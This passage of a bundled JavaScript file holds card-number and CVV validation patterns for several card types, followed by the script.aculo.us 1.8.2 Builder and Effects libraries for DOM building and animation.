//    'SS': [new RegExp('^((6759[0-9]{12})|(5018|5020|5038|6304|6759|6761|6763[0-9]{12,19})|(49[013][1356][0-9]{12})|(6333[0-9]{12})|(6334[0-4]\d{11})|(633110[0-9]{10})|(564182[0-9]{10}))([0-9]{2,3})?$'), new RegExp('^([0-9]{3}|[0-9]{4})?$'), true],
    'SO': [new RegExp('^(6334[5-9]([0-9]{11}|[0-9]{13,14}))|(6767([0-9]{12}|[0-9]{14,15}))$'), new RegExp('^([0-9]{3}|[0-9]{4})?$'), true],
    'SM': [new RegExp('(^(5[0678])[0-9]{11,18}$)|(^(6[^05])[0-9]{11,18}$)|(^(601)[^1][0-9]{9,16}$)|(^(6011)[0-9]{9,11}$)|(^(6011)[0-9]{13,16}$)|(^(65)[0-9]{11,13}$)|(^(65)[0-9]{15,18}$)|(^(49030)[2-9]([0-9]{10}$|[0-9]{12,13}$))|(^(49033)[5-9]([0-9]{10}$|[0-9]{12,13}$))|(^(49110)[1-2]([0-9]{10}$|[0-9]{12,13}$))|(^(49117)[4-9]([0-9]{10}$|[0-9]{12,13}$))|(^(49118)[0-2]([0-9]{10}$|[0-9]{12,13}$))|(^(4936)([0-9]{12}$|[0-9]{14,15}$))'), new RegExp('^([0-9]{3}|[0-9]{4})?$'), true],
    'VI': [new RegExp('^4[0-9]{12}([0-9]{3})?$'), new RegExp('^[0-9]{3}$'), true],
    'MC': [new RegExp('^5[1-5][0-9]{14}$'), new RegExp('^[0-9]{3}$'), true],
    'AE': [new RegExp('^3[47][0-9]{13}$'), new RegExp('^[0-9]{4}$'), true],
    'DI': [new RegExp('^6011[0-9]{12}$'), new RegExp('^[0-9]{3}$'), true],
    'JCB': [new RegExp('^(3[0-9]{15}|(2131|1800)[0-9]{11})$'), new RegExp('^[0-9]{3,4}$'), true],
    'OT': [false, new RegExp('^([0-9]{3}|[0-9]{4})?$'), false]
});

// script.aculo.us builder.js v1.8.2, Tue Nov 18 18:30:58 +0100 2008

// Copyright (c) 2005-2008 Thomas Fuchs (http://script.aculo.us, http://mir.aculo.us)
//
// script.aculo.us is freely distributable under the terms of an MIT-style license.
// For details, see the script.aculo.us web site: http://script.aculo.us/

var Builder = {
  NODEMAP: {
    AREA: 'map',
    CAPTION: 'table',
    COL: 'table',
    COLGROUP: 'table',
    LEGEND: 'fieldset',
    OPTGROUP: 'select',
    OPTION: 'select',
    PARAM: 'object',
    TBODY: 'table',
    TD: 'table',
    TFOOT: 'table',
    TH: 'table',
    THEAD: 'table',
    TR: 'table'
  },
  // note: For Firefox < 1.5, OPTION and OPTGROUP tags are currently broken,
  //       due to a Firefox bug
  node: function(elementName) {
    elementName = elementName.toUpperCase();

    // try innerHTML approach
    var parentTag = this.NODEMAP[elementName] || 'div';
    var parentElement = document.createElement(parentTag);
    try { // prevent IE "feature": http://dev.rubyonrails.org/ticket/2707
      parentElement.innerHTML = "<" + elementName + "></" + elementName + ">";
    } catch(e) {}
    var element = parentElement.firstChild || null;

    // see if browser added wrapping tags
    if(element && (element.tagName.toUpperCase() != elementName))
      element = element.getElementsByTagName(elementName)[0];

    // fallback to createElement approach
    if(!element) element = document.createElement(elementName);

    // abort if nothing could be created
    if(!element) return;

    // attributes (or text)
    if(arguments[1])
      if(this._isStringOrNumber(arguments[1]) ||
        (arguments[1] instanceof Array) ||
        arguments[1].tagName) {
          this._children(element, arguments[1]);
        } else {
          var attrs = this._attributes(arguments[1]);
          if(attrs.length) {
            try { // prevent IE "feature": http://dev.rubyonrails.org/ticket/2707
              parentElement.innerHTML = "<" +elementName + " " +
                attrs + "></" + elementName + ">";
            } catch(e) {}
            element = parentElement.firstChild || null;
            // workaround firefox 1.0.X bug
            if(!element) {
              element = document.createElement(elementName);
              for(attr in arguments[1])
                element[attr == 'class' ? 'className' : attr] = arguments[1][attr];
            }
            if(element.tagName.toUpperCase() != elementName)
              element = parentElement.getElementsByTagName(elementName)[0];
          }
        }

    // text, or array of children
    if(arguments[2])
      this._children(element, arguments[2]);

     return $(element);
  },
  _text: function(text) {
     return document.createTextNode(text);
  },

  ATTR_MAP: {
    'className': 'class',
    'htmlFor': 'for'
  },

  _attributes: function(attributes) {
    var attrs = [];
    for(attribute in attributes)
      attrs.push((attribute in this.ATTR_MAP ? this.ATTR_MAP[attribute] : attribute) +
          '="' + attributes[attribute].toString().escapeHTML().gsub(/"/,'&quot;') + '"');
    return attrs.join(" ");
  },
  _children: function(element, children) {
    if(children.tagName) {
      element.appendChild(children);
      return;
    }
    if(typeof children=='object') { // array can hold nodes and text
      children.flatten().each( function(e) {
        if(typeof e=='object')
          element.appendChild(e);
        else
          if(Builder._isStringOrNumber(e))
            element.appendChild(Builder._text(e));
      });
    } else
      if(Builder._isStringOrNumber(children))
        element.appendChild(Builder._text(children));
  },
  _isStringOrNumber: function(param) {
    return(typeof param=='string' || typeof param=='number');
  },
  build: function(html) {
    var element = this.node('div');
    $(element).update(html.strip());
    return element.down();
  },
  dump: function(scope) {
    if(typeof scope != 'object' && typeof scope != 'function') scope = window; //global scope

    var tags = ("A ABBR ACRONYM ADDRESS APPLET AREA B BASE BASEFONT BDO BIG BLOCKQUOTE BODY " +
      "BR BUTTON CAPTION CENTER CITE CODE COL COLGROUP DD DEL DFN DIR DIV DL DT EM FIELDSET " +
      "FONT FORM FRAME FRAMESET H1 H2 H3 H4 H5 H6 HEAD HR HTML I IFRAME IMG INPUT INS ISINDEX "+
      "KBD LABEL LEGEND LI LINK MAP MENU META NOFRAMES NOSCRIPT OBJECT OL OPTGROUP OPTION P "+
      "PARAM PRE Q S SAMP SCRIPT SELECT SMALL SPAN STRIKE STRONG STYLE SUB SUP TABLE TBODY TD "+
      "TEXTAREA TFOOT TH THEAD TITLE TR TT U UL VAR").split(/\s+/);

    tags.each( function(tag){
      scope[tag] = function() {
        return Builder.node.apply(Builder, [tag].concat($A(arguments)));
      };
    });
  }
};
// script.aculo.us effects.js v1.8.2, Tue Nov 18 18:30:58 +0100 2008

// Copyright (c) 2005-2008 Thomas Fuchs (http://script.aculo.us, http://mir.aculo.us)
// Contributors:
//  Justin Palmer (http://encytemedia.com/)
//  Mark Pilgrim (http://diveintomark.org/)
//  Martin Bialasinki
//
// script.aculo.us is freely distributable under the terms of an MIT-style license.
// For details, see the script.aculo.us web site: http://script.aculo.us/

// converts rgb() and #xxx to #xxxxxx format,
// returns self (or first argument) if not convertable
String.prototype.parseColor = function() {
  var color = '#';
  if (this.slice(0,4) == 'rgb(') {
    var cols = this.slice(4,this.length-1).split(',');
    var i=0; do { color += parseInt(cols[i]).toColorPart() } while (++i<3);
  } else {
    if (this.slice(0,1) == '#') {
      if (this.length==4) for(var i=1;i<4;i++) color += (this.charAt(i) + this.charAt(i)).toLowerCase();
      if (this.length==7) color = this.toLowerCase();
    }
  }
  return (color.length==7 ? color : (arguments[0] || this));
};

/*--------------------------------------------------------------------------*/

Element.collectTextNodes = function(element) {
  return $A($(element).childNodes).collect( function(node) {
    return (node.nodeType==3 ? node.nodeValue :
      (node.hasChildNodes() ? Element.collectTextNodes(node) : ''));
  }).flatten().join('');
};

Element.collectTextNodesIgnoreClass = function(element, className) {
  return $A($(element).childNodes).collect( function(node) {
    return (node.nodeType==3 ? node.nodeValue :
      ((node.hasChildNodes() && !Element.hasClassName(node,className)) ?
        Element.collectTextNodesIgnoreClass(node, className) : ''));
  }).flatten().join('');
};

Element.setContentZoom = function(element, percent) {
  element = $(element);
  element.setStyle({fontSize: (percent/100) + 'em'});
  if (Prototype.Browser.WebKit) window.scrollBy(0,0);
  return element;
};

Element.getInlineOpacity = function(element){
  return $(element).style.opacity || '';
};

Element.forceRerendering = function(element) {
  try {
    element = $(element);
    var n = document.createTextNode(' ');
    element.appendChild(n);
    element.removeChild(n);
  } catch(e) { }
};

/*--------------------------------------------------------------------------*/

var Effect = {
  _elementDoesNotExistError: {
    name: 'ElementDoesNotExistError',
    message: 'The specified DOM element does not exist, but is required for this effect to operate'
  },
  Transitions: {
    linear: Prototype.K,
    sinoidal: function(pos) {
      return (-Math.cos(pos*Math.PI)/2) + .5;
    },
    reverse: function(pos) {
      return 1-pos;
    },
    flicker: function(pos) {
      var pos = ((-Math.cos(pos*Math.PI)/4) + .75) + Math.random()/4;
      return pos > 1 ? 1 : pos;
    },
    wobble: function(pos) {
      return (-Math.cos(pos*Math.PI*(9*pos))/2) + .5;
    },
    pulse: function(pos, pulses) {
      return (-Math.cos((pos*((pulses||5)-.5)*2)*Math.PI)/2) + .5;
    },
    spring: function(pos) {
      return 1 - (Math.cos(pos * 4.5 * Math.PI) * Math.exp(-pos * 6));
    },
    none: function(pos) {
      return 0;
    },
    full: function(pos) {
      return 1;
    }
  },
  DefaultOptions: {
    duration:   1.0,   // seconds
    fps:        100,   // 100= assume 66fps max.
    sync:       false, // true for combining
    from:       0.0,
    to:         1.0,
    delay:      0.0,
    queue:      'parallel'
  },
  tagifyText: function(element) {
    var tagifyStyle = 'position:relative';
    if (Prototype.Browser.IE) tagifyStyle += ';zoom:1';

    element = $(element);
    $A(element.childNodes).each( function(child) {
      if (child.nodeType==3) {
        child.nodeValue.toArray().each( function(character) {
          element.insertBefore(
            new Element('span', {style: tagifyStyle}).update(
              character == ' ' ? String.fromCharCode(160) : character),
              child);
        });
        Element.remove(child);
      }
    });
  },
  multiple: function(element, effect) {
    var elements;
    if (((typeof element == 'object') ||
        Object.isFunction(element)) &&
       (element.length))
      elements = element;
    else
      elements = $(element).childNodes;

    var options = Object.extend({
      speed: 0.1,
      delay: 0.0
    }, arguments[2] || { });
    var masterDelay = options.delay;

    $A(elements).each( function(element, index) {
      new effect(element, Object.extend(options, { delay: index * options.speed + masterDelay }));
    });
  },
  PAIRS: {
    'slide':  ['SlideDown','SlideUp'],
    'blind':  ['BlindDown','BlindUp'],
    'appear': ['Appear','Fade']
  },
  toggle: function(element, effect) {
    element = $(element);
    effect = (effect || 'appear').toLowerCase();
    var options = Object.extend({
      queue: { position:'end', scope:(element.id || 'global'), limit: 1 }
    }, arguments[2] || { });
    Effect[element.visible() ?
      Effect.PAIRS[effect][1] : Effect.PAIRS[effect][0]](element, options);
  }
};

Effect.DefaultOptions.transition = Effect.Transitions.sinoidal;

/* ------------- core effects ------------- */

Effect.ScopedQueue = Class.create(Enumerable, {
  initialize: function() {
    this.effects  = [];
    this.interval = null;
  },
  _each: function(iterator) {
    this.effects._each(iterator);
  },
  add: function(effect) {
    var timestamp = new Date().getTime();

    var position = Object.isString(effect.options.queue) ?
      effect.options.queue : effect.options.queue.position;

    switch(position) {
      case 'front':
        // move unstarted effects after this effect
        this.effects.findAll(function(e){ return e.state=='idle' }).each( function(e) {
            e.startOn  += effect.finishOn;
            e.finishOn += effect.finishOn;
          });
        break;
      case 'with-last':
        timestamp = this.effects.pluck('startOn').max() || timestamp;
        break;
      case 'end':
        // start effect after last queued effect has finished
        timestamp = this.effects.pluck('finishOn').max() || timestamp;
        break;
    }

    effect.startOn  += timestamp;
    effect.finishOn += timestamp;

    if (!effect.options.queue.limit || (this.effects.length < effect.options.queue.limit))
      this.effects.push(effect);

    if (!this.interval)
      this.interval = setInterval(this.loop.bind(this), 15);
  },
  remove: function(effect) {
    this.effects = this.effects.reject(function(e) { return e==effect });
    if (this.effects.length == 0) {
      clearInterval(this.interval);
      this.interval = null;
    }
  },
  loop: function() {
    var timePos = new Date().getTime();
    for(var i=0, len=this.effects.length;i<len;i++)
      this.effects[i] && this.effects[i].loop(timePos);
  }
});

Effect.Queues = {
  instances: $H(),
  get: function(queueName) {
    if (!Object.isString(queueName)) return queueName;

    return this.instances.get(queueName) ||
      this.instances.set(queueName, new Effect.ScopedQueue());
  }
};
Effect.Queue = Effect.Queues.get('global');

Effect.Base = Class.create({
  position: null,
  start: function(options) {
    function codeForEvent(options,eventName){
      return (
        (options[eventName+'Internal'] ? 'this.options.'+eventName+'Internal(this);' : '') +
        (options[eventName] ? 'this.options.'+eventName+'(this);' : '')
      );
    }
    if (options && options.transition === false) options.transition = Effect.Transitions.linear;
    this.options      = Object.extend(Object.extend({ },Effect.DefaultOptions), options || { });
    this.currentFrame = 0;
    this.state        = 'idle';
    this.startOn      = this.options.delay*1000;
    this.finishOn     = this.startOn+(this.options.duration*1000);
    this.fromToDelta  = this.options.to-this.options.from;
    this.totalTime    = this.finishOn-this.startOn;
    this.totalFrames  = this.options.fps*this.options.duration;

    this.render = (function() {
      function dispatch(effect, eventName) {
        if (effect.options[eventName + 'Internal'])
          effect.options[eventName + 'Internal'](effect);
        if (effect.options[eventName])
          effect.options[eventName](effect);
      }

      return function(pos) {
        if (this.state === "idle") {
          this.state = "running";
          dispatch(this, 'beforeSetup');
          if (this.setup) this.setup();
          dispatch(this, 'afterSetup');
        }
        if (this.state === "running") {
          pos = (this.options.transition(pos) * this.fromToDelta) + this.options.from;
          this.position = pos;
          dispatch(this, 'beforeUpdate');
          if (this.update) this.update(pos);
          dispatch(this, 'afterUpdate');
        }
      };
    })();

    this.event('beforeStart');
    if (!this.options.sync)
      Effect.Queues.get(Object.isString(this.options.queue) ?
        'global' : this.options.queue.scope).add(this);
  },
  loop: function(timePos) {
    if (timePos >= this.startOn) {
      if (timePos >= this.finishOn) {
        this.render(1.0);
        this.cancel();
        this.event('beforeFinish');
        if (this.finish) this.finish();
        this.event('afterFinish');
        return;
      }
      var pos   = (timePos - this.startOn) / this.totalTime,
          frame = (pos * this.totalFrames).round();
      if (frame > this.currentFrame) {
        this.render(pos);
        this.currentFrame = frame;
      }
    }
  },
  cancel: function() {
    if (!this.options.sync)
      Effect.Queues.get(Object.isString(this.options.queue) ?
        'global' : this.options.queue.scope).remove(this);
    this.state = 'finished';
  },
  event: function(eventName) {
    if (this.options[eventName + 'Internal']) this.options[eventName + 'Internal'](this);
    if (this.options[eventName]) this.options[eventName](this);
  },
  inspect: function() {
    var data = $H();
    for(property in this)
      if (!Object.isFunction(this[property])) data.set(property, this[property]);
    return '#<Effect:' + data.inspect() + ',options:' + $H(this.options).inspect() + '>';
  }
});

Effect.Parallel = Class.create(Effect.Base, {
  initialize: function(effects) {
    this.effects = effects || [];
    this.start(arguments[1]);
  },
  update: function(position) {
    this.effects.invoke('render', position);
  },
  finish: function(position) {
    this.effects.each( function(effect) {
      effect.render(1.0);
      effect.cancel();
      effect.event('beforeFinish');
      if (effect.finish) effect.finish(position);
      effect.event('afterFinish');
    });
  }
});

Effect.Tween = Class.create(Effect.Base, {
  initialize: function(object, from, to) {
    object = Object.isString(object) ? $(object) : object;
    var args = $A(arguments), method = args.last(),
      options = args.length == 5 ? args[3] : null;
    this.method = Object.isFunction(method) ? method.bind(object) :
      Object.isFunction(object[method]) ? object[method].bind(object) :
      function(value) { object[method] = value };
    this.start(Object.extend({ from: from, to: to }, options || { }));
  },
  update: function(position) {
    this.method(position);
  }
});

Effect.Event = Class.create(Effect.Base, {
  initialize: function() {
    this.start(Object.extend({ duration: 0 }, arguments[0] || { }));
  },
  update: Prototype.emptyFunction
});

Effect.Opacity = Class.create(Effect.Base, {
  initialize: function(element) {
    this.element = $(element);
    if (!this.element) throw(Effect._elementDoesNotExistError);
    // make this work on IE on elements without 'layout'
    if (Prototype.Browser.IE && (!this.element.currentStyle.hasLayout))
      this.element.setStyle({zoom: 1});
    var options = Object.extend({
      from: this.element.getOpacity() || 0.0,
      to:   1.0
    }, arguments[1] || { });
    this.start(options);
  },
  update: function(position) {
    this.element.setOpacity(position);
  }
});

Effect.Move = Class.create(Effect.Base, {
  initialize: function(element) {
    this.element = $(element);
    if (!this.element) throw(Effect._elementDoesNotExistError);
    var options = Object.extend({
      x:    0,
      y:    0,
      mode: 'relative'
    }, arguments[1] || { });
    this.start(options);
  },
  setup: function() {
    this.element.makePositioned();
    this.originalLeft = parseFloat(this.element.getStyle('left') || '0');
    this.originalTop  = parseFloat(this.element.getStyle('top')  || '0');
    if (this.options.mode == 'absolute') {
      this.options.x = this.options.x - this.originalLeft;
      this.options.y = this.options.y - this.originalTop;
    }
  },
  update: function(position) {
    this.element.setStyle({
      left: (this.options.x  * position + this.originalLeft).round() + 'px',
      top:  (this.options.y  * position + this.originalTop).round()  + 'px'
    });
  }
});

// for backwards compatibility
Effect.MoveBy = function(element, toTop, toLeft) {
  return new Effect.Move(element,
    Object.extend({ x: toLeft, y: toTop }, arguments[3] || { }));
};

Effect.Scale = Class.create(Effect.Base, {
  initialize: function(element, percent) {
    this.element = $(element);
    if (!this.element) throw(Effect._elementDoesNotExistError);
    var options = Object.extend({
      scaleX: true,
      scaleY: true,
      scaleContent: true,
      scaleFromCenter: false,
      scaleMode: 'box',        // 'box' or 'contents' or { } with provided values
      scaleFrom: 100.0,
      scaleTo:   percent
    }, arguments[2] || { });
    this.start(options);
  },
  setup: function() {
    this.restoreAfterFinish = this.options.restoreAfterFinish || false;
    this.elementPositioning = this.element.getStyle('position');

    this.originalStyle = { };
    ['top','left','width','height','fontSize'].each( function(k) {
      this.originalStyle[k] = this.element.style[k];
    }.bind(this));

    this.originalTop  = this.element.offsetTop;
    this.originalLeft = this.element.offsetLeft;

    var fontSize = this.element.getStyle('font-size') || '100%';
    ['em','px','%','pt'].each( function(fontSizeType) {
      if (fontSize.indexOf(fontSizeType)>0) {
        this.fontSize     = parseFloat(fontSize);
        this.fontSizeType = fontSizeType;
      }
    }.bind(this));

    this.factor = (this.options.scaleTo - this.options.scaleFrom)/100;

    this.dims = null;
    if (this.options.scaleMode=='box')
      this.dims = [this.element.offsetHeight, this.element.offsetWidth];
    if (/^content/.test(this.options.scaleMode))
      this.dims = [this.element.scrollHeight, this.element.scrollWidth];
    if (!this.dims)
      this.dims = [this.options.scaleMode.originalHeight,
                   this.options.scaleMode.originalWidth];
  },
  update: function(position) {
    var currentScale = (this.options.scaleFrom/100.0) + (this.factor * position);
    if (this.options.scaleContent && this.fontSize)
      this.element.setStyle({fontSize: this.fontSize * currentScale + this.fontSizeType });
    this.setDimensions(this.dims[0] * currentScale, this.dims[1] * currentScale);
  },
  finish: function(position) {
    if (this.restoreAfterFinish) this.element.setStyle(this.originalStyle);
  },
  setDimensions: function(height, width) {
    var d = { };
    if (this.options.scaleX) d.width = width.round() + 'px';
    if (this.options.scaleY) d.height = height.round() + 'px';
    if (this.options.scaleFromCenter) {
      var topd  = (height - this.dims[0])/2;
      var leftd = (width  - this.dims[1])/2;
      if (this.elementPositioning == 'absolute') {
        if (this.options.scaleY) d.top = this.originalTop-topd + 'px';
        if (this.options.scaleX) d.left = this.originalLeft-leftd + 'px';
      } else {
        if (this.options.scaleY) d.top = -topd + 'px';
        if (this.options.scaleX) d.left = -leftd + 'px';
      }
    }
    this.element.setStyle(d);
  }
});

Effect.Highlight = Class.create(Effect.Base, {
  initialize: function(element) {
    this.element = $(element);
    if (!this.element) throw(Effect._elementDoesNotExistError);
    var options = Object.extend({ startcolor: '#ffff99' }, arguments[1] || { });
    this.start(options);
  },
  setup: function() {
    // Prevent executing on elements not in the layout flow
    if (this.element.getStyle('display')=='none') { this.cancel(); return; }
    // Disable background image during the effect
    this.oldStyle = { };
    if (!this.options.keepBackgroundImage) {
      this.oldStyle.backgroundImage = this.element.getStyle('background-image');
      this.element.setStyle({backgroundImage: 'none'});
    }
    if (!this.options.endcolor)
      this.options.endcolor = this.element.getStyle('background-color').parseColor('#ffffff');
    if (!this.options.restorecolor)
      this.options.restorecolor = this.element.getStyle('background-color');
    // init color calculations
    this._base  = $R(0,2).map(function(i){ return parseInt(this.options.startcolor.slice(i*2+1,i*2+3),16) }.bind(this));
    this._delta = $R(0,2).map(function(i){ return parseInt(this.options.endcolor.slice(i*2+1,i*2+3),16)-this._base[i] }.bind(this));
  },
  update: function(position) {
    this.element.setStyle({backgroundColor: $R(0,2).inject('#',function(m,v,i){
      return m+((this._base[i]+(this._delta[i]*position)).round().toColorPart()); }.bind(this)) });
  },
  finish: function() {
    this.element.setStyle(Object.extend(this.oldStyle, {
      backgroundColor: this.options.restorecolor
    }));
  }
});

Effect.ScrollTo = function(element) {
  var options = arguments[1] || { },
  scrollOffsets = document.viewport.getScrollOffsets(),
  elementOffsets = $(element).cumulativeOffset();

  if (options.offset) elementOffsets[1] += options.offset;

  return new Effect.Tween(null,
    scrollOffsets.top,
    elementOffsets[1],
    options,
    function(p){ scrollTo(scrollOffsets.left, p.round()); }
  );
};

/* ------------- combination effects ------------- */

Effect.Fade = function(element) {
  element = $(element);
  var oldOpacity = element.getInlineOpacity();
  var options = Object.extend({
    from: element.getOpacity() || 1.0,
    to:   0.0,
    afterFinishInternal: function(effect) {
      if (effect.options.to!=0) return;
      effect.element.hide().setStyle({opacity: oldOpacity});
    }
  }, arguments[1] || { });
  return new Effect.Opacity(element,options);
};

Effect.Appear = function(element) {
  element = $(element);
  var options = Object.extend({
  from: (element.getStyle('display') == 'none' ? 0.0 : element.getOpacity() || 0.0),
  to:   1.0,
  // force Safari to render floated elements properly
  afterFinishInternal: function(effect) {
    effect.element.forceRerendering();
  },
  beforeSetup: function(effect) {
    effect.element.setOpacity(effect.options.from).show();
  }}, arguments[1] || { });
  return new Effect.Opacity(element,options);
};

Effect.Puff = function(element) {
  element = $(element);
  var oldStyle = {
    opacity: element.getInlineOpacity(),
    position: element.getStyle('position'),
    top:  element.style.top,
    left: element.style.left,
    width: element.style.width,
    height: element.style.height
  };
  return new Effect.Parallel(
   [ new Effect.Scale(element, 200,
      { sync: true, scaleFromCenter: true, scaleContent: true, restoreAfterFinish: true }),
     new Effect.Opacity(element, { sync: true, to: 0.0 } ) ],
     Object.extend({ duration: 1.0,
      beforeSetupInternal: function(effect) {
        Position.absolutize(effect.effects[0].element);
      },
      afterFinishInternal: function(effect) {
         effect.effects[0].element.hide().setStyle(oldStyle); }
     }, arguments[1] || { })
   );
};

Effect.BlindUp = function(element) {
  element = $(element);
  element.makeClipping();
  return new Effect.Scale(element, 0,
    Object.extend({ scaleContent: false,
      scaleX: false,
      restoreAfterFinish: true,
      afterFinishInternal: function(effect) {
        effect.element.hide().undoClipping();
      }
    }, arguments[1] || { })
  );
};

Effect.BlindDown = function(element) {
  element = $(element);
  var elementDimensions = element.getDimensions();
  return new Effect.Scale(element, 100, Object.extend({
    scaleContent: false,
    scaleX: false,
    scaleFrom: 0,
    scaleMode: {originalHeight: elementDimensions.height, originalWidth: elementDimensions.width},
    restoreAfterFinish: true,
    afterSetup: function(effect) {
      effect.element.makeClipping().setStyle({height: '0px'}).show();
    },
    afterFinishInternal: function(effect) {
      effect.element.undoClipping();
    }
  }, arguments[1] || { }));
};

Effect.SwitchOff = function(element) {
  element = $(element);
  var oldOpacity = element.getInlineOpacity();
  return new Effect.Appear(element, Object.extend({
    duration: 0.4,
    from: 0,
    transition: Effect.Transitions.flicker,
    afterFinishInternal: function(effect) {
      new Effect.Scale(effect.element, 1, {
        duration: 0.3, scaleFromCenter: true,
        scaleX: false, scaleContent: false, restoreAfterFinish: true,
        beforeSetup: function(effect) {
          effect.element.makePositioned().makeClipping();
        },
        afterFinishInternal: function(effect) {
          effect.element.hide().undoClipping().undoPositioned().setStyle({opacity: oldOpacity});
        }
      });
    }
  }, arguments[1] || { }));
};

Effect.DropOut = function(element) {
  element = $(element);
  var oldStyle = {
    top: element.getStyle('top'),
    left: element.getStyle('left'),
    opacity: element.getInlineOpacity() };
  return new Effect.Parallel(
    [ new Effect.Move(element, {x: 0, y: 100, sync: true }),
      new Effect.Opacity(element, { sync: true, to: 0.0 }) ],
    Object.extend(
      { duration: 0.5,
        beforeSetup: function(effect) {
          effect.effects[0].element.makePositioned();
        },
        afterFinishInternal: function(effect) {
          effect.effects[0].element.hide().undoPositioned().setStyle(oldStyle);
        }
      }, arguments[1] || { }));
};

Effect.Shake = function(element) {
  element = $(element);
  var options = Object.extend({
    distance: 20,
    duration: 0.5
  }, arguments[1] || {});
  var distance = parseFloat(options.distance);
  var split = parseFloat(options.duration) / 10.0;
  var oldStyle = {
    top: element.getStyle('top'),
    left: element.getStyle('left') };
    return new Effect.Move(element,
      { x:  distance, y: 0, duration: split, afterFinishInternal: function(effect) {
    new Effect.Move(effect.element,
      { x: -distance*2, y: 0, duration: split*2,  afterFinishInternal: function(effect) {
    new Effect.Move(effect.element,
      { x:  distance*2, y: 0, duration: split*2,  afterFinishInternal: function(effect) {
    new Effect.Move(effect.element,
      { x: -distance*2, y: 0, duration: split*2,  afterFinishInternal: function(effect) {
    new Effect.Move(effect.element,
      { x:  distance*2, y: 0, duration: split*2,  afterFinishInternal: function(effect) {
    new Effect.Move(effect.element,
      { x: -distance, y: 0, duration: split, afterFinishInternal: function(effect) {
        effect.element.undoPositioned().setStyle(oldStyle);
  }}); }}); }}); }}); }}); }});
};

Effect.SlideDown = function(element) {
  element = $(element).cleanWhitespace();
  // SlideDown need to have the content of the element wrapped in a container element with fixed height!
  var oldInnerBottom = element.down().getStyle('bottom');
  var elementDimensions = element.getDimensions();
  return new Effect.Scale(element, 100, Object.extend({
    scaleContent: false,
    scaleX: false,
    scaleFrom: window.opera ? 0 : 1,
    scaleMode: {originalHeight: elementDimensions.height, originalWidth: elementDimensions.width},
    restoreAfterFinish: true,
    afterSetup: function(effect) {
      effect.element.makePositioned();
      effect.element.down().makePositioned();
      if (window.opera) effect.element.setStyle({top: ''});
      effect.element.makeClipping().setStyle({height: '0px'}).show();
    },
    afterUpdateInternal: function(effect) {
      effect.element.down().setStyle({bottom:
        (effect.dims[0] - effect.element.clientHeight) + 'px' });
    },
    afterFinishInternal: function(effect) {
      effect.element.undoClipping().undoPositioned();
      effect.element.down().undoPositioned().setStyle({bottom: oldInnerBottom}); }
    }, arguments[1] || { })
  );
};

Effect.SlideUp = function(element) {
  element = $(element).cleanWhitespace();
  var oldInnerBottom = element.down().getStyle('bottom');
  var elementDimensions = element.getDimensions();
  return new Effect.Scale(element, window.opera ? 0 : 1,
   Object.extend({ scaleContent: false,
    scaleX: false,
    scaleMode: 'box',
    scaleFrom: 100,
    scaleMode: {originalHeight: elementDimensions.height, originalWidth: elementDimensions.width},
    restoreAfterFinish: true,
    afterSetup: function(effect) {
      effect.element.makePositioned();
      effect.element.down().makePositioned();
      if (window.opera) effect.element.setStyle({top: ''});
      effect.element.makeClipping().show();
    },
    afterUpdateInternal: function(effect) {
      effect.element.down().setStyle({bottom:
        (effect.dims[0] - effect.element.clientHeight) + 'px' });
    },
    afterFinishInternal: function(effect) {
      effect.element.hide().undoClipping().undoPositioned();
      effect.element.down().undoPositioned().setStyle({bottom: oldInnerBottom});
    }
   }, arguments[1] || { })
  );
};

// Bug in opera makes the TD containing this element expand for a instance after finish
Effect.Squish = function(element) {
  return new Effect.Scale(element, window.opera ? 1 : 0, {
    restoreAfterFinish: true,
    beforeSetup: function(effect) {
      effect.element.makeClipping();
    },
    afterFinishInternal: function(effect) {
      effect.element.hide().undoClipping();
    }
  });
};

Effect.Grow = function(element) {
  element = $(element);
  var options = Object.extend({
    direction: 'center',
    moveTransition: Effect.Transitions.sinoidal,
    scaleTransition: Effect.Transitions.sinoidal,
    opacityTransition: Effect.Transitions.full
  }, arguments[1] || { });
  var oldStyle = {
    top: element.style.top,
    left: element.style.left,
    height: element.style.height,
    width: element.style.width,
    opacity: element.getInlineOpacity() };

  var dims = element.getDimensions();
  var initialMoveX, initialMoveY;
  var moveX, moveY;

  switch (options.direction) {
    case 'top-left':
      initialMoveX = initialMoveY = moveX = moveY = 0;
      break;
    case 'top-right':
      initialMoveX = dims.width;
      initialMoveY = moveY = 0;
      moveX = -dims.width;
      break;
    case 'bottom-left':
      initialMoveX = moveX = 0;
      initialMoveY = dims.height;
      moveY = -dims.height;
      break;
    case 'bottom-right':
      initialMoveX = dims.width;
      initialMoveY = dims.height;
      moveX = -dims.width;
      moveY = -dims.height;
      break;
    case 'center':
      initialMoveX = dims.width / 2;
      initialMoveY = dims.height / 2;
      moveX = -dims.width / 2;
      moveY = -dims.height / 2;
      break;
  }

  return new Effect.Move(element, {
    x: initialMoveX,
    y: initialMoveY,
    duration: 0.01,
    beforeSetup: function(effect) {
      effect.element.hide().makeClipping().makePositioned();
    },
    afterFinishInternal: function(effect) {
      new Effect.Parallel(
        [ new Effect.Opacity(effect.element, { sync: true, to: 1.0, from: 0.0, transition: options.opacityTransition }),
          new Effect.Move(effect.element, { x: moveX, y: moveY, sync: true, transition: options.moveTransition }),
          new Effect.Scale(effect.element, 100, {
            scaleMode: { originalHeight: dims.height, originalWidth: dims.width },
            sync: true, scaleFrom: window.opera ? 1 : 0, transition: options.scaleTransition, restoreAfterFinish: true})
        ], Object.extend({
             beforeSetup: function(effect) {
               effect.effects[0].element.setStyle({height: '0px'}).show();
             },
             afterFinishInternal: function(effect) {
               effect.effects[0].element.undoClipping().undoPositioned().setStyle(oldStyle);
             }
           }, options)
      );
    }
  });
};

Effect.Shrink = function(element) {
  element = $(element);
  var options = Object.extend({
    direction: 'center',
    moveTransition: Effect.Transitions.sinoidal,
    scaleTransition: Effect.Transitions.sinoidal,
    opacityTransition: Effect.Transitions.none
  }, arguments[1] || { });
  var oldStyle = {
    top: element.style.top,
    left: element.style.left,
    height: element.style.height,
    width: element.style.width,
    opacity: element.getInlineOpacity() };

  var dims = element.getDimensions();
  var moveX, moveY;

  switch (options.direction) {
    case 'top-left':
      moveX = moveY = 0;
      break;
    case 'top-right':
      moveX = dims.width;
      moveY = 0;
      break;
    case 'bottom-left':
      moveX = 0;
      moveY = dims.height;
      break;
    case 'bottom-right':
      moveX = dims.width;
      moveY = dims.height;
      break;
    case 'center':
      moveX = dims.width / 2;
      moveY = dims.height / 2;
      break;
  }

  return new Effect.Parallel(
    [ new Effect.Opacity(element, { sync: true, to: 0.0, from: 1.0, transition: options.opacityTransition }),
